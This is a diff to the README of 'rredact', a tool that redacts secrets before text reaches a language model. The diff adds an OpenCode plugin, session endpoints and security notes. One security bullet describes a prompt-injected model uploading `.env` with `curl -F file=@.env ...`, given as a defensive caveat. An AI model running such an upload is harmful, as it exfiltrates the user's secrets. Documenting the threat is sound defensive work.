@@ -33,7 +33,7 @@ contains the original values and must **never** be committed or sent to an LLM.
 - **Good defaults:** known token formats, variable-name heuristics for `.env`
   files, and a large imported PII rule set.
 - **Extensible:** project-specific YAML rules, Gitleaks-compatible TOML,
-  OpenRedaction imports, and an OpenCode plugin later.
+  OpenRedaction imports, and an OpenCode plugin.
 
 ## Quick start
 
@@ -327,7 +327,8 @@ curl -s http://127.0.0.1:8787/redact \
 ```
 
 Endpoints: `GET /health`, `GET /rules`, `POST /redact`, `POST /restore`,
-`POST /rules/validate`, `POST /rules/reload`. See [docs/api.md](docs/api.md).
+`DELETE /sessions/:session`, `POST /rules/validate`, `POST /rules/reload`.
+See [docs/api.md](docs/api.md).
 
 ## CI and pre-commit
 
@@ -349,14 +350,22 @@ repos:
 
 ## OpenCode plugin
 
-The core is intentionally split into a library and a local API. The planned
-plugin integration (tool hooks, per-session mappings, cleanup) is described in
-[docs/opencode-plugin.md](docs/opencode-plugin.md).
+[`packages/opencode-rredact`](packages/opencode-rredact/README.md) is an
+OpenCode V2 plugin that redacts prompts, tool results and assembled model
+requests automatically, before they can reach a model provider. It starts
+`rredact serve` on loopback with a random token, keeps one in-memory mapping
+per OpenCode session by default, restores placeholders for write/edit inputs,
+and fails closed by default. See [docs/opencode-plugin.md](docs/opencode-plugin.md)
+for the architecture and options.
 
 ## Security
 
 - `.rredact/mapping.json` contains the original values. It is written with mode
   `0600` and ignored by Git.
+- Per-session mappings under `.rredact/sessions/` also contain original values.
+  They are written with mode `0600`, ignored by Git, and deleted when a session
+  ends. The OpenCode plugin keeps them in memory by default (`--no-store`);
+  persisted mappings are an explicit opt-in.
 - The API binds to loopback by default. Non-loopback hosts require a token (or
   an explicit `--allow-remote`).
 - `scan` never writes a mapping file.
@@ -373,6 +382,10 @@ plugin integration (tool hooks, per-session mappings, cleanup) is described in
   current rules missed. It is ignored by Git and must be deleted after use.
 - Runtime redaction must be automatic. Do not rely on an LLM to redact its own
   inputs voluntarily.
+- Redaction protects the model context, not tool egress. A prompt-injected model
+  with shell or network access can upload a file without reading it
+  (`curl -F file=@.env ...`). Use network egress control, tool permissions and a
+  sandbox for that threat.
 
 ## Development
 
@@ -381,6 +394,15 @@ cargo fmt --check
 cargo clippy --all-targets -- -D warnings
 cargo test
 ./target/release/rredact scan . --fail-on high
+```
+
+OpenCode plugin:
+
+```bash
+cd packages/opencode-rredact
+npm install
+npm run typecheck
+npm test          # integration tests need target/debug/rredact
 ```
 
 ## License
